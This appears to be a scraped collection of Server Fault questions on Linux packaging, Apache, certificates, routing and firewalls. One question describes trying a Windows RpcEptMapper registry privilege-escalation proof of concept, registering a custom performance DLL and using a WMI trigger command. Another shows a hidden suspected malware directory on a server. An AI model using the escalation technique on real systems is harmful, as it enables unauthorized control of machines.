<pre><code>N: Skipping acquire of configured file 'main/binary-armhf/Packages' as repository 'http://repo.r1soft.com/apt stable InRelease' doesn't support architecture 'armhf'
</code></pre>

<p>What I did next, just for the sake of it, is change the architecture used for the repository. I found the repository supports <code>amd64</code>.</p>

<p>I altered the <code>/etc/apt/sources.list</code> to read:</p>

<pre><code>deb [arch=amd64] http://repo.r1soft.com/apt stable main
</code></pre>

<p>This resulted in the APT error disappearing:</p>

<pre><code>root@host:~# apt-get update
Get:1 http://last.public.ovh.hdaas.snap.mirrors.ovh.net/ubuntu xenial InRelease
Hit:2 http://ports.ubuntu.com/ubuntu-ports xenial InRelease                    
Ign:3 http://repo.r1soft.com/apt stable InRelease                              
Hit:4 http://repo.r1soft.com/apt stable Release                              
Get:6 http://repo.r1soft.com/apt stable/main amd64 Packages [3633 B]
Fetched 6325 B in 1s (3953 B/s)    
Reading package lists... Done
W: http://repo.r1soft.com/apt/dists/stable/Release.gpg: Signature by key 8954063F882837AE08F8D2CB1BF3530AA40384ED uses weak digest algorithm (SHA1)
</code></pre>

<p>However, upon actually installing the package, APT gets an error:</p>

<pre><code>root@host:~#  apt-get install serverbackup-enterprise 
Reading package lists... Done
Building dependency tree        
Reading state information... Done
E: Unable to locate package serverbackup-enterprise
</code></pre>

<p>Naturally, that doesn't work, as we're still installing the package from the repository without specifying the architecture. Upon doing this:</p>

<pre><code>root@host:~#  apt-get install serverbackup-enterprise:amd64
Reading package lists... Done
Building dependency tree        
Reading state information... Done
The following additional packages will be installed:
  r1soft-docstore:amd64 r1soft-getmodule:amd64 serverbackup-manager:amd64
  serverbackup-setup:amd64
The following NEW packages will be installed:
  r1soft-docstore:amd64 r1soft-getmodule:amd64 serverbackup-enterprise:amd64
  serverbackup-manager:amd64 serverbackup-setup:amd64
0 upgraded, 5 newly installed, 0 to remove and 0 not upgraded.
Need to get 348 MB of archives.
After this operation, 0 B of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://repo.r1soft.com/apt stable/main amd64 r1soft-docstore amd64 6.2.2-78 [2110 kB]
Get:2 http://repo.r1soft.com/apt stable/main amd64 r1soft-getmodule amd64 1.0.0-51 [1860 kB]
Get:3 http://repo.r1soft.com/apt stable/main amd64 serverbackup-setup amd64 6.2.2-78 [2740 kB]
Get:4 http://repo.r1soft.com/apt stable/main amd64 serverbackup-manager amd64 6.2.2-78 [341 MB]
Get:5 http://repo.r1soft.com/apt stable/main amd64 serverbackup-enterprise amd64 6.2.2-78 [71.7 kB]
Fetched 348 MB in 2min 46s (2092 kB/s)                                         
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
    LANGUAGE = (unset),
    LC_ALL = (unset),
    LC_CTYPE = ""UTF-8"",
    LANG = ""C.UTF-8""
    are supported and installed on your system.
perl: warning: Falling back to a fallback locale (""C.UTF-8"").
locale: Cannot set LC_CTYPE to default locale: No such file or directory
locale: Cannot set LC_ALL to default locale: No such file or directory
dpkg: error processing archive /var/cache/apt/archives/r1soft-docstore_6.2.2-78_amd64.deb (--unpack):
 package architecture (amd64) does not match system (armhf)
dpkg: error processing archive /var/cache/apt/archives/r1soft-getmodule_1.0.0-51_amd64.deb (--unpack):
 package architecture (amd64) does not match system (armhf)
dpkg: error processing archive /var/cache/apt/archives/serverbackup-setup_6.2.2-78_amd64.deb (--unpack):
 package architecture (amd64) does not match system (armhf)
dpkg: error processing archive /var/cache/apt/archives/serverbackup-manager_6.2.2-78_amd64.deb (--unpack):
 package architecture (amd64) does not match system (armhf)
dpkg: error processing archive /var/cache/apt/archives/serverbackup-enterprise_6.2.2-78_amd64.deb (--unpack):
 package architecture (amd64) does not match system (armhf)
Errors were encountered while processing:
 /var/cache/apt/archives/r1soft-docstore_6.2.2-78_amd64.deb
 /var/cache/apt/archives/r1soft-getmodule_1.0.0-51_amd64.deb
 /var/cache/apt/archives/serverbackup-setup_6.2.2-78_amd64.deb
 /var/cache/apt/archives/serverbackup-manager_6.2.2-78_amd64.deb
 /var/cache/apt/archives/serverbackup-enterprise_6.2.2-78_amd64.deb
E: Sub-process /usr/bin/dpkg returned an error code (1)
</code></pre>

<p>So what I was thinking... The application itself supports the architecture - nothing can go wrong there.</p>

<p><strong>Is there a way to 'fake' the CPU architecture?</strong></p>

<p>I tried doing this hoping APT gathers the information from the output of the <code>uname</code> command, but I doubt this. I still tried anyway:</p>

<pre><code>alias UNAME=""echo Linux host 4.9.2-armada375 #1 SMP Mon Jan 23 16:52:54 CET 2017 amd64 amd64 amd64 GNU/Linux""
</code></pre>

<p>Instead of:</p>

<pre><code>alias UNAME=""echo Linux host 4.9.2-armada375 #1 SMP Mon Jan 23 16:52:54 CET 2017 armv7l armv7l armv7l GNU/Linux""
</code></pre>
","<ubuntu><debian><architecture><arm>","2017-04-28 11:18:23"
"920575","Apache: Redirect requests base on the url","<p>I have apache running(port 443) and i have my node api running(port 2000). and my ssl isn't a wild card.</p>

<p>My Problem:</p>

<p>i'm getting mix content error on UI cause i'm trying to call my api using http since i don't have wild card ssl,i cannot create a sub domain and proxy pass to my api. how can i redirect traffic using apache to my api base on the url </p>

<p>URL : <a href=""http://example.com:2000/api/v1/category/get-all"" rel=""nofollow noreferrer"">http://example.com:2000/api/v1/category/get-all</a></p>

<p>all my endpoints have /api/v1/ common</p>
","<apache-2.2>","2018-07-12 03:20:36"
"920595","Apache: too many redirects","<p>My Scenario:</p>

<p>i have running apache severing my UI and i have my node api running on port 2000 and i have a reserves proxy on apache to proxy request to api and i have configure ssl as well and i want to redirect http to https. this is my following config</p>

<pre><code>&lt;VirtualHost *:80&gt;

        ServerAdmin admin@example.com
        ServerName example.com
        ServerAlias www.example.com
        DocumentRoot /var/www/example.com/public_html


        RewriteEngine on
        RewriteRule ^/api/v1/(.*) http://localhost:2000/api/v1/$1 [P,L]

        RewriteEngine on
        RewriteCond %{HTTPS} off
        RewriteRule (.*) https://%{SERVER_NAME}/$1 [R,L]


        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined


&lt;/VirtualHost&gt;
</code></pre>

<p>SSL config</p>

<pre><code>&lt;IfModule mod_ssl.c&gt;
    &lt;VirtualHost _default_:443&gt;
        ServerAdmin admin@example.com
        ServerName example.com
        ServerAlias www.example.com
        DocumentRoot /var/www/example.com/public_html     

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined    

        SSLEngine on 

        SSLCertificateFile  /etc/apache2/ssl/example.com.crt
        SSLCertificateKeyFile /etc/apache2/ssl/pkey.key    

        &lt;FilesMatch ""\.(cgi|shtml|phtml|php)$""&gt;
                SSLOptions +StdEnvVars
        &lt;/FilesMatch&gt;
        &lt;Directory /usr/lib/cgi-bin&gt;
                SSLOptions +StdEnvVars
        &lt;/Directory&gt;


    &lt;/VirtualHost&gt;
&lt;/IfModule&gt;
</code></pre>

<p>i'm getting too many redirects, how can i solve this?</p>
","<apache2>","2018-07-12 07:19:06"
"847320","Active directory on AWS","<p>does anyone know of a way of running an active directory domain controller, in amazon web services, and connect it to a physical pc outside of the network.
Many thanks</p>
","<active-directory><amazon-web-services><cloud>","2017-04-29 09:32:17"
"847480","Why is my .name domain name reserved?","<p>I was recently introduced to the <code>.name</code> TLD by a friend, since it would offer a good alternative to <code>.com</code> and <code>.net</code>, which are both taken for my last name. Naturally, I went to <code>name.com</code>, <code>godaddy.com</code>, <code>gandi.net</code>, etc. only to find out I couldn't register the domain name. It didn't give me any reason why so I decided to navigate to my desired <code>.name</code> domain in my browser and Chrome returned <code>DNS_PROBE_FINISHED_NXDOMAIN</code>. After a quick <code>whois</code> from the command line it returned this:</p>

<pre><code>Disclaimer: ...

****

Not available for registration.
Second level domain name is reserved.
</code></pre>

<p>Why is my desired <code>.name</code> domain name not available for registration and reserved? Reserved by whom? I told my friend about this and he told me that his was available at almost every domain registrar. Why is it that my desired domain name isn't so ""lucky""? What can I do to still acquire my domain?</p>
","<domain><domain-registrar><domain-registration>","2017-04-30 18:54:55"
"1044436","Powershell: ""adsi"" - look up user id given a full name?","<p>I have a list of team members names - in a first_name, last_name format in a CSV.
How can I look up their names in AD using Powershell - so that I can get their domain userids ?</p>
<p>I saw examples where &quot;adsi&quot; was used to look based on domain userid-&gt;full-name, but I need to perform this the other way round.</p>
<p>(For instance: <a href=""https://serverfault.com/questions/582696/retrieve-current-domain-users-full-name"">Retrieve current domain user&#39;s full name</a>)</p>
<p>I'm not admin on the domain - just a regular user - and want to avoid installing the Active Directory Libraries if possible (since I would like to share the script with other colleagues also - need minimum pre-reqs)</p>
","<powershell><adsi>","2020-11-30 18:01:06"
"921942","Cheapest solution to monitor gigabit internet connection performance","<p>I want to perform <code>speedtest-cli</code> performance tests of the internet connection of a fibre connection which is advertised to 1Gbps at regular intervals, say every hour, for one year. I have been looking at single board computers such as banana-pi which has advertised 10/100/1000 ethernet. But <a href=""https://www.htpcguides.com/raspberry-vs-banana-pi-benchmarks-sata-gigabit-matter/"" rel=""nofollow noreferrer"">performance tests</a> show that it still doesnt have 1Gbits throughput even though it is advertised as having gigabit ethernet. People with the same aim as me, may have the following questions:</p>

<ul>
<li>What could be limiting the performance in single board computers such as banana-pi?</li>
<li>What is the cheapest fanless computer which could perform such tests reliably? What is the relevant hardware specificantions required?</li>
</ul>
","<performance><linux-networking><network-speed>","2018-07-14 14:17:37"
"921962","Semi-selfservice user registration","<p>I don't want to have wide-open registration on my server so I don't have to deal with spam accounts, but at the same time I don't want to have to manually add accounts for each person I invite to my ejabberd server.  Is there a way to have one-time registration URLs or one-time codes to input on the registration page that I can generate and hand out, and then each person can set up their own account?</p>
","<user-management><user-accounts><ejabberd>","2018-07-14 18:25:44"
"847682","Is it safe to ssh to a compromised server?","<p>I have a compromised server, I want to know if I ssh to that , then the malware can also compromise my local machine (transfer a file to it and ...) or not?</p>
","<ssh><file-sharing>","2017-05-02 01:49:18"
"847740","Can I setup my laptop as a webserver without static IP?","<p>I want to use my laptop as a server and want to access it from a domain. I have installed PHP, MySQL and Apache on it.</p>

<p>I have read many blogs and they say I need to have an static IP for my laptop and need to forward my domain name to my laptop's static IP.</p>

<p>Is there any other way to do this? Any 3rd party service ?</p>
","<linux><web-hosting><local-area-network>","2017-05-02 10:38:39"
"922074","List of most popular server side web hosting languages?","<p>I am looking for some online resources providing statistics, or at least ranking, of server-side installations based on the language (and maybe version and environment).</p>

<p>We are trying to choose the appropriate language for an upcoming general-purpose framework we are building, and a primary goal is to have  it installable by the most generic web hosting companies possible.</p>

<p>Obviously PHP is on top or close to it today. But what about Node.js or Rust? Can someone link to reliable sources that have conducted such a study recently?</p>
","<php><hosting><node.js><languages>","2018-07-16 08:23:19"
"922123","certbot creates a certificate with ""wwww"" instead of a bare domain one - unlike before","<p>I've been creating certificates this way for over a year:</p>

<pre><code>export website=""my_domain1111.com""
sudo certbot certonly --standalone -d $website -d www.$website --email hello@$website
</code></pre>

<p>and it's always created one for $website</p>

<pre><code>/etc/letsencrypt/live/my_domain1111.com
</code></pre>

<p>Today for some reason it created a one with ""www"" instead of a bare domain    </p>

<pre><code>export website=""another_my_domain222.com""
sudo certbot certonly --standalone -d $website -d www.$website --email hello@$website

# =&gt;&gt;&gt;
/etc/letsencrypt/live/www.another_my_domain222.com
</code></pre>

<p>Why? has there been any change recently in certbot?</p>

<p>I've tried changing the order of the ""-d"" params - the same effect:</p>

<pre><code>sudo certbot certonly --standalone  -d www.$website -d $website --email hello@$website

/etc/letsencrypt/live/www.another_my_domain222.com # with ""www""
</code></pre>

<p>Version - 0.25</p>
","<ssl-certificate><certificate><lets-encrypt><certbot>","2018-07-16 14:31:29"
"847942","my mails from postfix are going to spam","<p>i know this question has been already asked. but my problem is so wierd.
i have done everything needed to be done for avoiding spam, but my mails are still going to spam folder.
my mail-tester.com score is 10/10.
my allaboutspam.com test resuls is good too as you can see in the link below : 
<a href=""http://www.allaboutspam.com/email-server-test-report/?key=730551F2A3ACDF3B2303B6796FB2C725"" rel=""nofollow noreferrer"">test result</a></p>

<p>but mails are still going to spam, i don't know what to do, i have done everything on the internet.</p>
","<linux><email><postfix><email-server><sendmail>","2017-05-03 08:56:01"
"848018","Connect AD / DC to public domain","<p>I've set up a DC / AC in my home network. Ich also own a domain. So I want to connect the local DC / AC to my Domain, to login from everywhere to my network. 
I tried anything, but still no login servers available, when I try to connect fom outside.
Sorry for my bad english.</p>
","<domain-name-system><domain-controller>","2017-05-03 14:23:19"
"922260","Redirect https://www to https://","<p>I use this</p>

<pre><code>RewriteEngine On
RewriteCond %{HTTPS} off [OR]
RewriteCond %{HTTP_HOST} ^www\.(.+)$ [NC]
RewriteRule ^ https://kanzan.se%{REQUEST_URI} [L,NE,R=301]
</code></pre>

<p>to redirect ALL www to non-www, but it doesn't work when I type <a href=""https://www.kanzan.se"" rel=""nofollow noreferrer"">https://www.kanzan.se</a>. The www is still there!</p>
","<redirect><apache2>","2018-07-17 10:53:36"
"922363","How a dynamic dns provider update my IP for the subdomain he gave me?","<p>No-ip and dyndns, for example, give me a subdomain which will point to my latest IP address. However, how do they update the IP for this subdomain? </p>

<p>One method would be to ask the registar for this domain to update it for me, but this would take hours to propagate globally. However, my IP changes many times a day and I don't even notice the dynamic dns domain beig unresponsive until the next propagation.</p>

<p>This makes me think that another technology is being used. How it is done? Can I run one privately for subdomains of my domain?</p>
","<domain-name-system><ip><dns-hosting>","2018-07-17 21:35:49"
"1045137","Allow application through firewall Linux","<p>I installed clean CentOS 8 machine. copied my app to it. started. i can get response by</p>
<p><code>curl https://localhost:5001 -- insecure</code></p>
<p>but if I try a local or external ip or browser from remote location for example</p>
<pre><code>sudo firewall-cmd --zone=public --add-port 5001/tcp --permanent
sudo firewall-cmd --reload

curl https://10.128.0.10:5001 -- insecure
curl: (7) Failed to connect to 10.128.0.10 port 5001: Connection refused
</code></pre>
","<linux><centos><firewall>","2020-12-05 19:29:40"
"922459","Virus run by postgres user?","<p>I've found a program named <code>wipefs</code> run by the <code>postgres</code> user. The server is a <em>Ubuntu 12.04</em>.</p>

<p>When I did <code>ps ax|grep wipefs</code> I've got:</p>

<p><code>10209 ?        Sl     1:04 /var/tmp/.ICE-unix/-l/.db/wipefs --library-path /var/tmp/.ICE-unix/-l/.db /var/tmp/.ICE-unix/-l/.db/x</code></p>

<p>Then I did this:</p>

<p><code>ls -lah /var/tmp/.ICE-unix/-l/.db/
total 14M
drwxr-xr-x 2 postgres postgres 4.0K Jun 11 19:24 .
drwxr-xr-x 3 postgres postgres 4.0K Jul 17 21:00 ..
-rwxr-xr-x 1 postgres postgres 1.8M Nov 20  2017 libc.so.6
-rwxr-xr-x 1 postgres postgres 2.3M Nov 20  2017 libcrypto.so.1.0.0
-rwxr-xr-x 1 postgres postgres  15K Nov 20  2017 libdl.so.2
-rwxr-xr-x 1 postgres postgres  31K Nov 20  2017 libffi.so.6
-rwxr-xr-x 1 postgres postgres  88K Nov 20  2017 libgcc_s.so.1
-rwxr-xr-x 1 postgres postgres 898K Nov 20  2017 libgcrypt.so.20
-rwxr-xr-x 1 postgres postgres 511K Nov 20  2017 libgmp.so.10
-rwxr-xr-x 1 postgres postgres 1.2M Nov 20  2017 libgnutls.so.30
-rwxr-xr-x 1 postgres postgres  79K Nov 20  2017 libgpg-error.so.0
-rwxr-xr-x 1 postgres postgres 203K Nov 20  2017 libhogweed.so.4
-rwxr-xr-x 1 postgres postgres 232K Nov 20  2017 libhwloc.so.5
-rwxr-xr-x 1 postgres postgres 203K Nov 20  2017 libidn.so.11
-rwxr-xr-x 1 postgres postgres  39K Nov 20  2017 libltdl.so.7
-rwxr-xr-x 1 postgres postgres 1.1M Nov 20  2017 libm.so.6
-rwxr-xr-x 1 postgres postgres  95K Nov 20  2017 libmicrohttpd.so.10
-rwxr-xr-x 1 postgres postgres 215K Nov 20  2017 libnettle.so.6
-rwxr-xr-x 1 postgres postgres  43K Nov 20  2017 libnuma.so.1
-rwxr-xr-x 1 postgres postgres 399K Nov 20  2017 libp11-kit.so.0
-rwxr-xr-x 1 postgres postgres 136K Nov 20  2017 libpthread.so.0
-rwxr-xr-x 1 postgres postgres   77 Jun 11 19:21 libq.so.1
-rwxr-xr-x 1 postgres postgres  31K Nov 20  2017 librt.so.1
-rwxr-xr-x 1 postgres postgres  280 May 15 19:52 libs.so.1
-rwxr-xr-x 1 postgres postgres 419K Nov 20  2017 libssl.so.1.0.0
-rwxr-xr-x 1 postgres postgres 1.5M Nov 20  2017 libstdc++.so.6
-rwxr-xr-x 1 postgres postgres  75K Nov 20  2017 libtasn1.so.6
-rwxr-xr-x 1 postgres postgres 103K Nov 20  2017 libz.so.1
-rwxr-xr-x 1 postgres postgres 159K Nov 20  2017 wipefs
-rwxr-xr-x 1 postgres postgres 2.1M Jun  3 15:04 x
</code>
In other systems running PostgreSql the directory <code>/tmp/.ICE-unix</code> is empty.</p>

<p>Is this a virus?.</p>
","<ubuntu><postgresql>","2018-07-18 12:10:40"
"848193","How to debug a SSH socks tunnel connection?","<p>I followed this guide <a href=""https://www.digitalocean.com/community/tutorials/how-to-route-web-traffic-securely-without-a-vpn-using-a-socks-tunnel"" rel=""nofollow noreferrer"">https://www.digitalocean.com/community/tutorials/how-to-route-web-traffic-securely-without-a-vpn-using-a-socks-tunnel</a> on how to set up a VPS connection to Windows.</p>

<p>And my tunnel connection is running on Windows fine, Putty connects no problem, but when I add settings to my Firefox to use proxy, 127.0.0.1/localhost etc it simply does not load any page, it just doesn't work.</p>

<p>I also tested with <a href=""https://github.com/feralhosting/feralfilehosting/tree/master/Feral%20Wiki/SSH/SSH%20tunnels%20-%20MyEnTunnel"" rel=""nofollow noreferrer"">MyEntunnel</a>, and it reports the connection to tunnel is stable and gives green light. But proxy settings do not work in any application.</p>

<p>My Windows firewall is disabled.</p>

<p>Where do I look at first, to track down the problem?</p>
","<ssh><ssh-tunnel><socks><tunnel>","2017-05-04 08:48:39"
"922501","is it possible to connect to sites over the internet","<p>I have two sites which are 3km away from each other, both sites have internet access from the same ISP. I would like both sites to have access to each other throught the internet routers (TP-Link TD-W8968). Is it possible?? if not, please explain what do I need to achieve the connection with the lowest cost possible.</p>
","<networking><vpn><site-to-site-vpn>","2018-07-18 15:07:26"
"1045268","Loading a performance DLL of a windows 7 service","<p>I am trying to do a POC of recently published  <a href=""https://itm4n.github.io/windows-registry-rpceptmapper-eop/"" rel=""nofollow noreferrer"">windows zeroday flaw</a> where a vulnerability has been exposed in windows registry entries. I have created a performance subkey of a service RPCEPTMAPPER and set my DLL path there, however I am unable to load/execute it with this command given in article <code>Get-WmiObject -List | Where-Object { $_.Name -Like &quot;Win32_Perf*&quot; }</code>. Wont WMI get performance counter by loading DLLs in each running service? <a href=""https://i.sstatic.net/rvGCv.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/rvGCv.png"" alt=""enter image description here"" /></a> This is how my registry entry looks like.Thanks.</p>
","<windows-7><windows-registry><rpc><performance-counters>","2020-12-07 10:51:24"
"1045421","The zone 'asia-south1-b' does not have enough resources available to fulfill the request. Try a different zone, or try again later","<p>The zone 'projects/exalted-skein-281903/zones/asia-south1-b' does not have enough resources available to fulfill the request. Try a different zone, or try again later.</p>
<p>I am struggling to start VM on google cloud any help on what issue is or how to migrate the server to different India zone</p>
","<google-compute-engine>","2020-12-08 13:26:45"
"848440","How to change loopback network mask or redirect subnet to another interface","<p>I have the following problem.
First of all. Here are my interfaces.</p>

<pre><code># ip addr
ip addr
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue state UNKNOWN
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever

2: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 10.10.1.15/24 brd 10.10.1.255 scope global eth1
    inet6 fe80::a00:27ff:fe28:b0c4/64 scope link
       valid_lft forever preferred_lft forever
</code></pre>

<p>As you can see the loopback interface serves following network <code>127.0.0.1/8</code>, the network mask is <code>255.0.0.0</code>.</p>

<p>My problem is that I need to route all traffic for example for the network <code>127.22.0.0/16</code> to the interface <code>eth1</code>.</p>

<p>I have following routes now </p>

<pre><code>default via 10.10.1.2 dev eth1
default via 10.10.1.2 dev eth1  metric 203
10.10.1.0/24 dev eth1  scope link
10.10.1.0/24 dev eth1  proto kernel  scope link  src 10.10.1.15  metric 203
10.10.1.2 dev eth1  scope link
</code></pre>

<p>And I try to add the following route </p>

<pre><code>ip route add 127.22.0.0/16 via 10.10.1.2 dev eth1
</code></pre>

<p>But unfortunately it doesn't work.</p>

<p>Here is the output</p>

<pre><code>root@sys:/ # ip route flush cache
ip route flush cache
root@sys:/ # ip route get ""127.22.0.1""
ip route get ""127.22.0.1""
local 127.22.0.1 dev lo  src 127.0.0.1
    cache &lt;local&gt;
</code></pre>

<p>As you can see all packets are still redirected to loopback.</p>

<p>What is the best solution for that problem ?</p>
","<networking><ip><route><ip-routing><loopback>","2017-05-05 11:17:59"
"848472","Illegal Content in Company Assets","<p>I am trying to find illegal content in company laptop such as: movies, torrents, music, etc. </p>

<p>We are thinking of building a script that automates the search and reports filenames with certain extensions (.avi, .tor, .mp3, etc).</p>

<p>Does anyone has done this differently or have used a specific software for this purpose? </p>

<p>Thanks,</p>
","<windows><scripting><software>","2017-05-05 14:05:03"
"1045511","Homebrewed http start fails on macOS Big Sur","<p>I had installed Apache 2.4.46 on macOS Big Sur via Homebrew.
It had worked fine until I did <code>brew update</code> and <code>brew upgrade</code>. At this time, PHP was upgraded from 7.4 to 8.0, so I modified httpd.conf as following.</p>
<pre><code>#LoadModule php7_module /usr/local/opt/php/lib/httpd/modules/libphp7.so
#&lt;IfModule php7_module&gt;
#  AddType application/x-httpd-php .php
#&lt;/IfModule&gt;
#Updated to PHP 8.0.0.1
LoadModule php_module /usr/local/opt/php/lib/httpd/modules/libphp.so
&lt;FilesMatch \.php$&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>After that, I modified <code>/usr/local/etc/php/8.0/php.ini</code> as the same as <code>/usr/local/etc/php/7.4/php.ini</code>.</p>
<p>But <code>brew services start htppd</code> satys <code>==&gt; Successfully started </code>httpd<code> (label: homebrew.mxcl.httpd)</code>, but <code>brew services list</code> shows <code>httpd error MyUserName /Users/MyUserName/Library/LaunchAgents/homebrew.mxcl.httpd.plist</code>.</p>
<p>So I stopped httpd service on brew and started as follows.</p>
<pre><code>$ apachectl start
(48)Address already in use: AH00072: make_sock: could not bind to address 0.0.0.0:80
no listening sockets available, shutting down
AH00015: Unable to open logs
</code></pre>
<p>So, I can't continue to investigate furthermore.</p>
<p>Help, please.</p>
","<php><apache-2.4><mac-osx><httpd><brew>","2020-12-09 04:35:59"
"848691","How to block an Internal IP address talking to an external IP Address on Cisco ASA 5505","<p>I want to block my server talking to an external IP address continously.</p>

<p>The IP address in question is I think is being hijacked or spoofed. When Used who.is it resolves to Netherlands. But if you use any other tools it resolves to Jordan.</p>

<p>Any step by step configuration is highly appreciated.</p>

<p>Thank you
Kind Regards
N</p>
","<security><ip><cisco-asa><access-control-list><ip-blocking>","2017-05-07 10:08:43"
"1045745","The {0} ok prompt is missing a # inside the {}","<p>We have tried to replicate at our lab facility but were unable to get empty braces {}. We tried with hard drives in place and with none. There is also no errors indicated when using the rotary switch in the diag position. What does the number inside the braces mean {0} ok, {1} ok?</p>
","<solaris><sun><prompt>","2020-12-10 18:41:56"
"848746","How do I advertise routes from a non-OSPF network into OSPF networks","<p>I have the following configuration</p>

<p><a href=""https://i.sstatic.net/1m9A1.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/1m9A1.png"" alt=""enter image description here""></a></p>

<p>I have routers R6, R8, R9, R10 and R11 running OSPF. And routers R12, R13 and host C1 aren't. C1 has its default gateway set to R13's shared interface and R13 and R12 have their default gateways set to R6's interface with them.</p>

<p>Now, I'd like to ping a host connected to R11 from C1. The problem I have is that none of the routers running OSPF can see the network C1-R12-R13. The only network in that area I can see from any of them is the one shared by R6-R12-R13.</p>

<p>How can I make that other network known to the routers running OSPF?</p>

<p>Thanks</p>
","<networking><cisco><ospf>","2017-05-07 19:28:38"
"848781","Restricted group policy","<p>Hi I want to create an OU where i want to put all stored computers, servers and users with doubts. Idea is to restrict these objects (both Computer as well as user) in the domain. </p>

<p>When any floor engineer would take out the system from store, the group policy will not allow the system to be used in domain until he informs the Domain Admins. Once the admin moves the system to right OU, the system is then becomes usable. </p>

<p>Same way, if we have any doubt about any user id, we would move the user id to a restricted OU, where the group policy would restrict the user to get in to domain until domain admin moves the id to correct OU.</p>

<p>How do we do it? I want a group policy/ policies which will do this job for us.</p>
","<active-directory><group-policy>","2017-05-08 07:43:10"
"848786","How to block IP Address in ASA5505 firewall via ASDM?","<p>I have an ASA5505 firewall and I need to block an external IP address which is talking to my server.</p>

<p>Basically, the ASA firewall shows that my server is ""attacking"" this Destination Address. So the Source IP is i.e. 192.168.100.100 which is internal, attacking 188.247.70.93 on port 80 thru the inside interface. which is outside.</p>

<p>I have blocked the IP from my server firewall but I need to know how to block it from the ASA Firewall via asdm as I am not too familiar with CLI</p>

<p>I mean, I did create an ACL with all the entries and applied it to the Inside interface, but then I have to create another rule to allow any to any for outgoing otherwise the firewall blocks all outgoing.</p>

<p>The problem with creating any to any is that as soon as I create that I saw 350+ hits on that rule. So how do I go about doing this block without compromising my system?</p>

<p>Thank you</p>
","<access-control-list><cisco>","2017-05-08 07:21:56"
"923101","Are there any industry standards for network timeout or / IO timeout etc?","<p>I was reading this article about microbursts: <a href=""https://www.cisco.com/c/en/us/products/collateral/switches/nexus-5000-series-switches/white-paper-c11-733020.html"" rel=""nofollow noreferrer"">https://www.cisco.com/c/en/us/products/collateral/switches/nexus-5000-series-switches/white-paper-c11-733020.html</a></p>

<p>which can also cause traffic drops. </p>

<p>So, as these microbursts are inevitable and can't be detected in monitoring too due to the small amount of time interval they last, is there any industry standard for timeouts on each level (I/O, network) for all applications so that we don't need to keep tuning timeout for every application?</p>
","<networking><timeout><io>","2018-07-23 07:26:38"
"848922","Domain name does not appear for everyone","<p>I have a dynamic ip addresser. I can register a domain with that. I have tried to register a domain name that is only displayed on the computers that are connected to my modem.</p>

<p>For others not.</p>

<p>This is domain name IP I have registered is 192.168.0.122</p>

<p>It seems to me that the problem is port 80
I tried to test ip address with open port check.
But blocked there is a way to open it.
Not in the firewall of the pc or modem I've tried.</p>
","<domain-name-system><port><port-forwarding><domain-name>","2017-05-08 22:27:18"
"1046033","How is sendmail sending emails without port 25 opened?","<p>I have Amazon AWS server which I'm configuring to receive emails.</p>
<p>AWS states that port 25 is closed for outgoing connections unless you specifically apply to have it opened.</p>
<p>But I tried to send an email anyway with sendmail from the command prompt, and it was delivered successfully.</p>
<p>How did this happen?</p>
","<email><smtp><sendmail>","2020-12-13 19:48:37"
"1046056","Find out who stopped a process (7zip)","<p>How could I find out who stopped a process? It was a 7zip process making a backup and someone or something quitted it.</p>
","<windows>","2020-12-14 04:33:39"
"849062","Redirect subdomain to subdomain in HTTPS with Apache2","<p>I have those subdomains:</p>

<pre><code>link.domain.com
links.domain.com
</code></pre>

<p>I want to redirect the <code>link.domain.com</code> to <code>links.domain.com</code>. For this, I used the same method as described here : <a href=""https://serverfault.com/questions/663423/redirect-subdomain-to-subdomain-apache2"">Redirect subdomain to subdomain Apache2</a> and it works.</p>

<p>I installed a TLS certificate for <code>links.domain.com</code> with Let's Encrypt and I can perfectly access <code>links.domain.com</code> in HTTPS. I would like the redirection from <code>link.domain.com</code> to <code>links.domain.com</code> to be also effective in HTTPS.</p>

<p>Here is my conf file:</p>

<pre><code>&lt;IfModule mod_ssl.c&gt;
   &lt;VirtualHost *:443&gt;
      DocumentRoot /var/www/links/
      ServerName links.domain.com

      &lt;Directory ""/var/www/links/""&gt;
         Options Indexes MultiViews FollowSymLinks
         AllowOverride None
         Order deny,allow
         Allow from all
      &lt;/Directory&gt;

      ErrorLog ${APACHE_LOG_DIR}/error_links.log
      CustomLog ${APACHE_LOG_DIR}/access_links.log combined 

      # Possible values include: debug, info, notice, warn, error, crit,
      # alert, emerg.
      LogLevel warn

      SSLCertificateFile /etc/letsencrypt/live/links.domain.com/fullchain.pem
      SSLCertificateKeyFile /etc/letsencrypt/live/links.domain.com/privkey.pem
      Include /etc/letsencrypt/options-ssl-apache.conf
   &lt;/VirtualHost&gt;
&lt;/IfModule&gt;
</code></pre>

<p>I already tried the following :</p>

<ul>
<li><p>Adding</p>

<p><code>ServerAlias link.domain.com
 RedirectMatch permanent ^link.domain.com/(.*)$ https://links.domain.com/$1</code></p>

<p>after the <code>ServerName links.domain.com</code> line.</p></li>
<li><p>Adding</p>

<p><code>&lt;VirtualHost *:443&gt;
    ServerName link.domain.com
    RedirectMatch permanent ^/(.*)$ https://links.domain.com/$1
 &lt;/VirtualHost&gt;</code></p>

<p>before and after the already defined VirtualHost.</p></li>
</ul>

<p>No one worked.</p>

<p>Do you have any idea ?</p>
","<ssl><virtualhost><apache2><lets-encrypt>","2017-05-09 14:47:39"
"849084","VPNGate Connections - OpenVPN Certificate Errors","<p>I've been trying to figure this out for the past few days but couldn't find anything specific to this case. It doesn't look complicated, but I also don't know how to fix it from my end.</p>

<p>VPNGate provides free VPN access of other good Samaritan users' Internet. I exclusively use OpenVPN to connect to these servers rather than their advertised software.</p>

<p>Here's a log when everything goes well, and I'm able to connect without issues:</p>

